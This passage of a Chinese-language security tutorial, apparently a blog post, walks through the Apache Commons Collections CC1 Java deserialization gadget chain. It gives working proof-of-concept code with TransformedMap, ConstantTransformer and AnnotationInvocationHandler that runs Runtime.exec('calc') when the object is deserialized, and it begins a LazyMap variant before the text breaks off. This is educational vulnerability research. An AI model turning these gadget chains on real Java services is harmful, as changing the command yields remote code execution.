class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;  <span class="hljs-comment">// 包声明：com.example</span><br><br><span class="hljs-comment">// 导入必要的类</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;          <span class="hljs-comment">// 转换器接口</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;    <span class="hljs-comment">// 链式转换器</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;    <span class="hljs-comment">// 反射调用转换器</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CEXP</span> &#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <span class="hljs-comment">// 主方法</span><br>        <br>        <span class="hljs-comment">// 创建一个Transformer数组，定义攻击链的每一步</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-comment">// 第一步：通过反射获取Runtime类的getRuntime方法</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>            <br>            <span class="hljs-comment">// 第二步：调用getRuntime方法获取Runtime实例</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>            <br>            <span class="hljs-comment">// 第三步：在Runtime实例上调用exec方法执行计算器</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将三个Transformer组合成链式转换器</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <br>        <span class="hljs-comment">// 触发整个攻击链：从Runtime.class开始，最终执行calc命令</span><br>        chainedTransformer.transform(Runtime.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p>将此链与之前的链结合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// 解决了第一个问题</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-comment">//反射获取AnnotationInvocationHandler(),实例化AnnotationInvocationHandler类</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);<br><br>        <span class="hljs-comment">// 序列化反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="问题二：如何进入setValue方法"><a href="#问题二：如何进入setValue方法" class="headerlink" title="问题二：如何进入setValue方法"></a>问题二：如何进入setValue方法</h3><p>此时直接运行EXP是不能弹出计算器的</p><p>我们在AnnotationInvocationHandler.java的readObject第一个if处下一个断点进行调试查看</p><p><img src="/img/CC1/c22.png"></p><p>调试时发现并没有走入条件循环，而是直接跳出了</p><p>因为判断了memberType为空</p><p><img src="/img/CC1/c23.png"></p><p>所以程序执行都并未走入setValue方法</p><p>需要满足条件(传入注解中需要有成员方法，让我们构造Map时可传入对应键值对)</p><ol><li><p>传入注解中需要有成员方法</p><p><img src="/img/CC1/c24.png"></p></li><li><p>值是成员类型的实例(成员方法名与传入数组的键相同)</p><p><code>hashMap.put(&quot;para1&quot;, &quot;para2&quot;)</code> 中的 <code>para1</code> 与成员变量相对应</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//第二个if条件</span><br><span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br></code></pre></td></tr></table></figure></li></ol><p>但我们传参时传入的注解并没有成员</p><p><img src="/img/CC1/c25.png"></p><p>我们找到 <code>Target.class</code> ，点进 <code>Target</code>，当中有一个成员变量为 <code>value</code>，所以我们 <code>map.put</code> 也需要修改为 <code>value</code></p><p>此注解有成员方法</p><p><img src="/img/CC1/c26.png"></p><p>修改后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">// 装饰为 TransformedMap</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-comment">// 构造 AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们继续往下跟程序，发现 <code>setValue()</code> 处中的参数并不可控，而是指定了 <code>AnnotationTypeMismatchExceptionProxy</code> 类，是无法进行命令执行的。</p><p>我们需要找到一个类，能够可控 <code>setValue</code> 的参数。</p><h3 id="问题三：如何控制setValue参数"><a href="#问题三：如何控制setValue参数" class="headerlink" title="问题三：如何控制setValue参数"></a>问题三：如何控制setValue参数</h3><ul><li>我们这里找到了一个能够解决 <code>setValue</code> 可控参数的类 ———— <code>ConstantTransformer</code>。</li></ul><p>这个类完美符合我们的要求，点进去看一看。</p><p><img src="/img/CC1/c27.png"></p><p>发现传入什么，transform方法就会返回什么</p><p>利用此类，我们就可以控制transform传入的value值</p><p>我们先传入一个 <code>Runtime.class</code>，然后无论 <code>transform()</code> 方法会调用什么对象，都会返回 <code>Runtime.class</code></p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 第一步：通过反射获取Runtime类的getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第二步：调用getRuntime方法获取Runtime实例</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第三步：在Runtime实例上调用exec方法执行计算器</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将三个Transformer组合成链式转换器</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">// 装饰为 TransformedMap</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-comment">// 构造 AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行</p><p><img src="/img/CC1/c28.png"></p><h3 id="调用链梳理与总结"><a href="#调用链梳理与总结" class="headerlink" title="调用链梳理与总结"></a>调用链梳理与总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//利用链<br>InvokerTransformer#transform<br>TransformedMap#checkSetValue<br>AbstractInputCheckedMapDecorator#setValue<br>AnnotationInvocationHandler#readObject<br><br>//辅助链<br>ChainedTransformer   //将三个Transformer组合成链式转换器<br>ConstantTransformer  //使setValue的Value值为Runtime.class开启攻击<br>HashMap              //遍历数组时调用到setValue<br></code></pre></td></tr></table></figure><p><img src="/img/CC1/c29.png"></p><h2 id="LazyMap版CC1攻击链分析"><a href="#LazyMap版CC1攻击链分析" class="headerlink" title="LazyMap版CC1攻击链分析"></a>LazyMap版CC1攻击链分析</h2><h3 id="寻找链子"><a href="#寻找链子" class="headerlink" title="寻找链子"></a>寻找链子</h3><ul><li>这条链子的尾部依旧是InvokerTransformer的transform方法，利用其调用exec执行命令</li><li>与TransformMap版不同的是，我们在<code>InvokeTransformer</code> 下的 <code>transform</code> 方法，进行 查找用法操作时，选择了LazyMap类</li></ul><p><img src="/img/CC1/c30.png"></p><p>可以看到这个类的get方法调用了transform方法</p><p>这个类的构造方法是protected类型，无法直接新建实例</p><p>看到熟悉的decorate方法</p><p>这里依旧利用decorate方法新建实例</p><p><img src="/img/CC1/c31.png"></p><p>我们构造如下的 EXP，来证明这条链子暂时是可行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);<br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">lazyGetMethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);<br>        lazyGetMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        lazyGetMethod.invoke(decorateMap, 